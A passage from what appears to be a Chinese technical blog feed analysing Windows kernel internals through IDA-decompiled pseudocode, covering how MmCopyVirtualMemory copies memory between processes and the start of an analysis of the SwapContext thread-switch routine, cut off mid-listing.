<span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( Length &gt;= <span class="number">0x200</span> &amp;&amp; (flag &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            InitialSize = <span class="number">0xE000</span>;</span><br><span class="line">            <span class="keyword">if</span> ( Length &lt;= <span class="number">0xE000</span> )</span><br><span class="line">                InitialSize = Length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag &amp;= ~<span class="number">2u</span>;</span><br><span class="line">            InitialSize = <span class="number">0x10000</span>;</span><br><span class="line">            <span class="keyword">if</span> ( Length &lt;= <span class="number">0x10000</span> )</span><br><span class="line">                InitialSize = Length;</span><br><span class="line">            <span class="keyword">if</span> ( Length &lt;= <span class="number">0x200</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                LABEL_12:</span><br><span class="line">                P = &amp;v12;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    P = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, InitialSize, <span class="number">0x77526D4Du</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( P )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    InitialSize &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( InitialSize &lt;= <span class="number">0x200</span> )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">                &#125;</span><br><span class="line">                flag |= <span class="number">1u</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( MaxCount = InitialSize; ; DestPtr = (<span class="type">char</span> *)DestPtr + MaxCount )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !restLength )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( (flag &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                    <span class="built_in">ExFreePoolWithTag</span>(P, <span class="number">0</span>);</span><br><span class="line">                *NumberOfBytesCopy = Length;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( restLength &lt; MaxCount )</span><br><span class="line">                MaxCount = restLength;</span><br><span class="line">            <span class="built_in">KeStackAttachProcess</span>(Target_Process, &amp;ApcState);</span><br><span class="line">            mdlAddress = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( Src == src &amp;&amp; (_BYTE)AccessMode )</span><br><span class="line">            &#123;</span><br><span class="line">                v28 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;src[Length] &gt; MmUserProbeAddress || &amp;src[Length] &lt; src )</span><br><span class="line">                    *(_BYTE *)MmUserProbeAddress = <span class="number">0</span>;</span><br><span class="line">                v28 = <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            flag_1 = (flag &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( flag_1 )</span><br><span class="line">            &#123;</span><br><span class="line">                MemoryDescriptorList.Next = <span class="number">0</span>;</span><br><span class="line">                MemoryDescriptorList.Size = <span class="number">4</span></span><br><span class="line">                    * ((MaxCount &gt;&gt; <span class="number">12</span>)</span><br><span class="line">                       + ((((<span class="type">unsigned</span> __int16)Src &amp; <span class="number">0xFFF</span>) + (MaxCount &amp; <span class="number">0xFFF</span>) + <span class="number">4095</span>) &gt;&gt; <span class="number">12</span>))</span><br><span class="line">                    + <span class="number">28</span>;</span><br><span class="line">                MemoryDescriptorList.MdlFlags = <span class="number">0</span>;</span><br><span class="line">                MemoryDescriptorList.StartVa = (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)Src &amp; <span class="number">0xFFFFF000</span>);</span><br><span class="line">                MemoryDescriptorList.ByteOffset = (<span class="type">unsigned</span> __int16)Src &amp; <span class="number">0xFFF</span>;</span><br><span class="line">                MemoryDescriptorList.ByteCount = MaxCount;</span><br><span class="line">            &#125;</span><br><span class="line">            v9 = CurrentThread;</span><br><span class="line">            v23 = _bittestandset((<span class="type">signed</span> __int32 *)&amp;CurrentThread-&gt;<span class="number">60</span>, <span class="number">7u</span>);</span><br><span class="line">            v28 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( flag_1 )</span><br><span class="line">                <span class="built_in">MmProbeAndLockPages</span>(&amp;MemoryDescriptorList, AccessMode, IoReadAccess);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">memcpy</span>(P, Src, MaxCount);</span><br><span class="line">            v28 = <span class="number">-2</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v23 )</span><br><span class="line">                v9-&gt;MiscFlags &amp;= ~<span class="number">0x80u</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v17 &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            flag_1_copy = (flag &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( flag_1_copy )</span><br><span class="line">            &#123;</span><br><span class="line">                mdlAddress = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(&amp;MemoryDescriptorList, <span class="number">0</span>, MmCached, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">                <span class="keyword">if</span> ( !mdlAddress )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">MmUnlockPages</span>(&amp;MemoryDescriptorList);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">KeUnstackDetachProcess</span>(&amp;ApcState);</span><br><span class="line">            <span class="built_in">KeStackAttachProcess</span>(Origin_Process, &amp;ApcState);</span><br><span class="line">            <span class="keyword">if</span> ( Src == src &amp;&amp; (_BYTE)AccessMode )</span><br><span class="line">            &#123;</span><br><span class="line">                v28 = <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">ProbeForWrite</span>(dest, Length, <span class="number">1u</span>);</span><br><span class="line">                v28 = <span class="number">-2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v28 = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">if</span> ( flag_1_copy )</span><br><span class="line">                <span class="built_in">memcpy</span>(DestPtr, mdlAddress, MaxCount);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">memcpy</span>(DestPtr, P, MaxCount);</span><br><span class="line">            v28 = <span class="number">-2</span>;</span><br><span class="line">            <span class="built_in">KeUnstackDetachProcess</span>(&amp;ApcState);</span><br><span class="line">            <span class="keyword">if</span> ( flag_1_copy )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">MmUnmapLockedPages</span>(mdlAddress, &amp;MemoryDescriptorList);</span><br><span class="line">                <span class="built_in">MmUnlockPages</span>(&amp;MemoryDescriptorList);</span><br><span class="line">            &#125;</span><br><span class="line">            restLength -= MaxCount;</span><br><span class="line">            Src = (<span class="type">char</span> *)Src + MaxCount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (flag &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            LABEL_34:</span><br><span class="line">            flag &amp;= ~<span class="number">2u</span>;</span><br><span class="line">            <span class="built_in">KeUnstackDetachProcess</span>(&amp;ApcState);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *NumberOfBytesCopy = Length - restLength;</span><br><span class="line">    <span class="built_in">KeUnstackDetachProcess</span>(&amp;ApcState);</span><br><span class="line">    <span class="keyword">if</span> ( (flag &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>(P, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000D</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看逻辑根本没法看，感觉最关键的来源于 <code>flag</code> 参数，交叉一下可以大概看出</p><img src="/2025/01/25/WindowsProcess5/3.png" class=""><p>只对最低位（第零位）和第一位做了判断，并且第一位只在最开始被赋值了。</p><p>开始去设置每次循环拷贝的字节数，大约是 <code>min(Length,0xE000)</code>，如果flag 第一位为0 或者是 <code>Length&lt;0x200</code>，则设置为 <code>min(Length,0x10000)</code>。</p><p><code>else</code> 分支里面 <code>Length&lt;=0x200</code> 则直接用栈分配内存，超过则用分页池分配内存，从设置的大小（<code>InitialSize</code>）开始分配，若分配失败则每次尝试 <code>/2</code>，直到 <code>0x200</code> 为止再次转而用栈中转。这里可以看出，<code>flag</code> 的最低位是判断是否成功分配了分页内存，以便于出错的时候判断释放。</p><p>可以看出，如果开始就走了 <code>if</code> 分支，那么线程挂靠之后，会使用 MDL 锁住对应进程的虚拟内存并将它转化为物理页（通过调用 API：<code>MmProbeAndLockPages</code>）。如果顺利，则使用 <code>MmProbeAndLockPages</code> 再将对应物理页映射到虚拟页便于拷贝。如果发现无法映射，则直接将 <code>flag</code> 的第一位清零，所以这一位可以认为是判断能否使用 <code>MDL</code> 读取内存。</p><p>最后，直接 <code>memcpy</code> 拷贝内存即可，当然一些善后工作也要做好。</p><p>如果发现 <code>MDL</code> 失败了，则程序会尝试分配分页池内存，然后挂靠目标进程将内存直接拷贝到分页池，再挂靠回原进程将分页池的内存写入源进程。</p><p>所以 <code>MmCopyVirtualMemory</code> 函数优先使用 <code>MDL</code> 的方式拷贝内存，如果失败则直接在内核空间分配内存拷贝。<code>MDL</code> 拷贝的速度会比较快，因为事实上只进行了一次拷贝，从目标进程拷贝出来的过程只用到了挂物理页，而采用内存池分配内存拷贝则需要多进行一次拷贝，速度相对来说会更慢。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li><strong>初始化阶段</strong>：<ul><li>如果拷贝长度 <code>Length</code> 为 0，直接返回成功。</li><li>设置 <code>flag</code>，用于控制流程判断：<ul><li>第一位（<code>flag &amp; 1</code>）：是否分配了分页池内存。</li><li>第二位（<code>flag &amp; 2</code>）：是否尝试使用 MDL。</li></ul></li><li>计算单次拷贝的最大长度（<code>InitialSize</code>），规则如下：<ul><li>如果 <code>Length &gt;= 0x200</code> 且可以尝试 MDL（<code>flag &amp; 2</code>），初始大小为 <code>min(Length, 0xE000)</code>。</li><li>否则，设置为 <code>min(Length, 0x10000)</code>。</li></ul></li></ul></li><li><strong>内存分配策略</strong>：<ul><li>优先选择栈内存（小于 <code>0x200</code> 时）。</li><li>对较大的内存使用分页池分配（<code>ExAllocatePoolWithTag</code>），如果失败则逐步减小分配大小（<code>/2</code>），直至退回栈内存。</li></ul></li><li><strong>MDL 拷贝流程</strong>：<ul><li>尝试挂靠目标进程上下文（<code>KeStackAttachProcess</code>）。</li><li>调用 <code>MmProbeAndLockPages</code> 锁定虚拟页并转为物理页。</li><li>成功后，利用 <code>MmMapLockedPagesSpecifyCache</code> 映射到内核虚拟地址，并完成拷贝。</li><li>如果 MDL 操作失败，清除第二位标志（<code>flag &amp; 2</code>），切换为分页池拷贝。</li></ul></li><li><strong>分页池拷贝流程</strong>：<ul><li>挂靠目标进程，将目标内存数据拷贝到分页池内存中。</li><li>挂靠源进程，从分页池将数据写入到目标位置。</li></ul></li><li><strong>清理和退出</strong>：<ul><li>每次循环后更新剩余长度 <code>restLength</code>，直到完成或发生错误。</li><li>根据 <code>flag</code> 判断是否需要释放分页池内存（<code>ExFreePoolWithTag</code>）。</li><li>成功返回 0，失败返回特定错误码（如 <code>0x8000000D</code>）。</li></ul></li></ol><hr><p>跨进程写的代码就不分析了，大概率也是同理可得。</p><h2 id="进程创建分析"><a href="#进程创建分析" class="headerlink" title="进程创建分析"></a>进程创建分析</h2><p>咕咕咕~</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15861519.html">https://www.cnblogs.com/wingsummer/p/15861519.html</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15963678.html">https://www.cnblogs.com/wingsummer/p/15963678.html</a></li></ul>]]></content>
    
    
    <summary type="html">深入研究一下线程调度，由于篇幅较多，分章节分析，第二篇。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——深入研究线程调度（1）</title>
    <link href="https://xia0ji233.github.io/2025/01/25/WindowsProcess4/"/>
    <id>https://xia0ji233.github.io/2025/01/25/WindowsProcess4/</id>
    <published>2025-01-24T17:00:00.000Z</published>
    <updated>2025-01-24T17:53:36.997Z</updated>
    
    <content type="html"><![CDATA[<p>深入研究一下线程调度，由于篇幅较多，分章节分析</p><span id="more"></span><h2 id="SwapContext"><a href="#SwapContext" class="headerlink" title="SwapContext"></a>SwapContext</h2><p>首先研究一下 <code>SwapContext</code> 函数的实现。</p><h3 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h3><p>这里我们不去分析汇编代码，而是直接用 IDA + F5，把定义还原回去即可清晰地看出逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __usercall SwapContext@&lt;al&gt;(</span><br><span class="line">    _KPCR *PCR@&lt;ebx&gt;,</span><br><span class="line">    _KTHREAD *CurrentThread@&lt;edi&gt;,</span><br><span class="line">    _KTHREAD *NextThread@&lt;esi&gt;,</span><br><span class="line">    <span class="type">int</span> irql@&lt;ecx&gt;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> __int32 v5; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">char</span> *InitialStack; <span class="comment">// ecx</span></span><br><span class="line">    _EPROCESS *Process; <span class="comment">// ecx</span></span><br><span class="line">    _KPROCESS *v8; <span class="comment">// ebp</span></span><br><span class="line">    _KPROCESS *v9; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">void</span> *ArbitraryUserPointer; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">void</span> *NextThreadStackPointer; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">char</span> *v12; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> __int32 v13; <span class="comment">// ebp</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">    _NT_TIB *Teb; <span class="comment">// eax</span></span><br><span class="line">    _KGDTENTRY *_GDT; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">bool</span> v20; <span class="comment">// zf</span></span><br><span class="line">    _KGDTENTRY *GDT; <span class="comment">// ecx</span></span><br><span class="line">    _KPRCB *p_PrcbData; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">    <span class="type">char</span> v24; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">    _EXCEPTION_REGISTRATION_RECORD *ExceptionList; <span class="comment">// [esp-8h] [ebp-8h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v26; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line">    _UNKNOWN *retaddr; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( NextThread-&gt;Running )</span><br><span class="line">        _mm_pause();</span><br><span class="line">    NextThread-&gt;Running = <span class="number">1</span>;</span><br><span class="line">    v26 = irql;</span><br><span class="line">    _disable();</span><br><span class="line">    --PCR-&gt;PrcbData.NestingLevel;</span><br><span class="line">    v4 = __rdtsc() - PCR-&gt;PrcbData.StartCycles;</span><br><span class="line">    PCR-&gt;PrcbData.HighCycleTime = (v4 + __PAIR64__(PCR-&gt;PrcbData.HighCycleTime, PCR-&gt;PrcbData.CycleTime)) &gt;&gt; <span class="number">0x20</span>;</span><br><span class="line">    PCR-&gt;PrcbData.CycleTime += v4;</span><br><span class="line">    PCR-&gt;PrcbData.StartCycles += v4;</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">5</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">        KiBeginCounterAccumulation(NextThread, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;Header.ThreadControlFlags &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ExceptionList = (_EXCEPTION_REGISTRATION_RECORD *)NextThread;</span><br><span class="line">        v24 = <span class="number">1</span>;</span><br><span class="line">        p_PrcbData = &amp;PCR-&gt;PrcbData;</span><br><span class="line">        _enable();</span><br><span class="line">        PsCheckThreadCpuQuota((<span class="type">int</span>)p_PrcbData, v24, (<span class="type">int</span>)ExceptionList);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LABEL_4:</span><br><span class="line">        _enable();</span><br><span class="line">    &#125;</span><br><span class="line">    ++PCR-&gt;NtTib.Version;</span><br><span class="line">    ExceptionList = PCR-&gt;NtTib.ExceptionList;</span><br><span class="line">    v5 = __readcr0();</span><br><span class="line">    <span class="keyword">if</span> ( CurrentThread-&gt;NpxState )</span><br><span class="line">    &#123;</span><br><span class="line">        InitialStack = (<span class="type">char</span> *)CurrentThread-&gt;InitialStack;</span><br><span class="line">        <span class="keyword">if</span> ( (v5 &amp; <span class="number">0xE</span>) != <span class="number">0</span> )</span><br><span class="line">            __writecr0(v5 &amp; <span class="number">0xFFFFFFF1</span>);</span><br><span class="line">        _fxsave(InitialStack - <span class="number">528</span>);</span><br><span class="line">        CurrentThread-&gt;NpxState &amp;= <span class="number">0xF8</span>u;</span><br><span class="line">        PCR-&gt;PrcbData.NpxThread = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CurrentThread-&gt;KernelStack = &amp;ExceptionList;</span><br><span class="line">    Process = (_EPROCESS *)NextThread-&gt;Process;</span><br><span class="line">    <span class="keyword">if</span> ( Process != (_EPROCESS *)CurrentThread-&gt;Process )</span><br><span class="line">        KiUpdateSpeculationControl(Process);</span><br><span class="line">    v8 = NextThread-&gt;ApcState.Process;</span><br><span class="line">    v9 = CurrentThread-&gt;ApcState.Process;</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v9 )</span><br><span class="line">    &#123;</span><br><span class="line">        ArbitraryUserPointer = PCR-&gt;NtTib.ArbitraryUserPointer;</span><br><span class="line">        _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v8-&gt;ActiveProcessors.Bitmap, (<span class="type">unsigned</span> <span class="type">int</span>)ArbitraryUserPointer);</span><br><span class="line">        _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v9-&gt;ActiveProcessors.Bitmap, (<span class="type">unsigned</span> <span class="type">int</span>)ArbitraryUserPointer);</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)&amp;v9-&gt;LdtDescriptor.LimitLow | *(_DWORD *)&amp;v8-&gt;LdtDescriptor.LimitLow )</span><br><span class="line">        &#123;</span><br><span class="line">            _EAX = *(_DWORD *)&amp;v8-&gt;LdtDescriptor.LimitLow;</span><br><span class="line">            <span class="keyword">if</span> ( _EAX )</span><br><span class="line">            &#123;</span><br><span class="line">                GDT = PCR-&gt;GDT;</span><br><span class="line">                *(_DWORD *)&amp;GDT[<span class="number">9</span>].LimitLow = _EAX;</span><br><span class="line">                GDT[<span class="number">9</span>].HighWord.Bits = v8-&gt;LdtDescriptor.HighWord.Bits;</span><br><span class="line">                PCR-&gt;IDT[<span class="number">0x21</span>] = v8-&gt;Int21Descriptor;</span><br><span class="line">                LOWORD(_EAX) = <span class="number">72</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __asm &#123; lldt    ax &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        __writecr3(v8-&gt;DirectoryTableBase);</span><br><span class="line">    &#125;</span><br><span class="line">    NextThreadStackPointer = NextThread-&gt;InitialStack;</span><br><span class="line">    v12 = (<span class="type">char</span> *)NextThreadStackPointer - <span class="number">528</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*((<span class="type">char</span> *)NextThreadStackPointer - <span class="number">554</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">        v12 = (<span class="type">char</span> *)NextThreadStackPointer - <span class="number">544</span>;</span><br><span class="line">    *((_DWORD *)PCR-&gt;NtTib.SubSystemTib + <span class="number">1</span>) = v12;</span><br><span class="line">    *((_WORD *)PCR-&gt;NtTib.SubSystemTib + <span class="number">51</span>) = v8-&gt;IopmOffset;</span><br><span class="line">    <span class="keyword">if</span> ( (dword_532FC4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        EtwTraceContextSwap((_ETHREAD *)CurrentThread, (_ETHREAD *)NextThread);</span><br><span class="line">        NextThreadStackPointer = NextThread-&gt;InitialStack;</span><br><span class="line">    &#125;</span><br><span class="line">    CurrentThread-&gt;Running = <span class="number">0</span>;</span><br><span class="line">    v13 = __readcr0();</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">0xE</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v13 &amp;= <span class="number">0xFFFFFFF1</span>;</span><br><span class="line">        __writecr0(v13);</span><br><span class="line">    &#125;</span><br><span class="line">    _fxrstor((<span class="type">char</span> *)NextThreadStackPointer - <span class="number">528</span>);</span><br><span class="line">    NextThread-&gt;NpxState |= <span class="number">7u</span>;</span><br><span class="line">    __writefsdword(<span class="number">0x5C0</span>u, (<span class="type">unsigned</span> <span class="type">int</span>)NextThread);<span class="comment">// NpxThread</span></span><br><span class="line">    v14 = *((_DWORD *)NextThreadStackPointer - <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (NextThread-&gt;NpxState &amp; <span class="number">7</span>) == <span class="number">0</span> )</span><br><span class="line">        v14 |= NpxStateNotLoaded;</span><br><span class="line">    v15 = v13 &amp; <span class="number">0xFFFFFFF1</span> | v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 != v13 )</span><br><span class="line">        __writecr0(v15);</span><br><span class="line">    Teb = (_NT_TIB *)NextThread-&gt;Teb;</span><br><span class="line">    PCR-&gt;NtTib.Self = Teb;</span><br><span class="line">    _GDT = PCR-&gt;GDT;</span><br><span class="line">    _GDT[<span class="number">7</span>].BaseLow = (<span class="type">unsigned</span> __int16)Teb;</span><br><span class="line">    Teb = (_NT_TIB *)((<span class="type">unsigned</span> <span class="type">int</span>)Teb &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    _GDT[<span class="number">7</span>].HighWord.Bytes.BaseMid = (<span class="type">unsigned</span> __int8)Teb;</span><br><span class="line">    _GDT[<span class="number">7</span>].HighWord.Bytes.BaseHi = BYTE1(Teb);</span><br><span class="line">    ++NextThread-&gt;ContextSwitches;</span><br><span class="line">    PCR-&gt;NtTib.ExceptionList = ExceptionList;</span><br><span class="line">    v18 = v26;</span><br><span class="line">    <span class="keyword">if</span> ( PCR-&gt;PrcbData.DpcRoutineActive )</span><br><span class="line">        KeBugCheckEx(<span class="number">0xB8</span>u, (ULONG_PTR)CurrentThread, (ULONG_PTR)NextThread, (ULONG_PTR)CurrentThread-&gt;InitialStack, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !NextThread-&gt;ApcState.KernelApcPending )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v20 = NextThread-&gt;SpecialApcDisable == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !NextThread-&gt;SpecialApcDisable )</span><br><span class="line">    &#123;</span><br><span class="line">        v20 = (_BYTE)v26 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v26 )</span><br><span class="line">        &#123;</span><br><span class="line">            LOBYTE(v18) = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">int</span>)&amp;retaddr | HalRequestSoftwareInterrupt(v18)) == <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 <code>_mm_pause();</code> 其实是汇编指令 <code>pause</code> 的实现，查阅 x86 手册可以看到说明：</p><p><code>Gives hint to processor that improves performance of spin-wait loops.</code> 主要是提高自旋锁循环等待的性能。</p><p>其中我们是可以看到一些切换线程必备的操作的：</p><p>如果切换的线程所属进程与当前进程不一致，则切换 cr3 为下一个线程所属进程的 cr3 值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 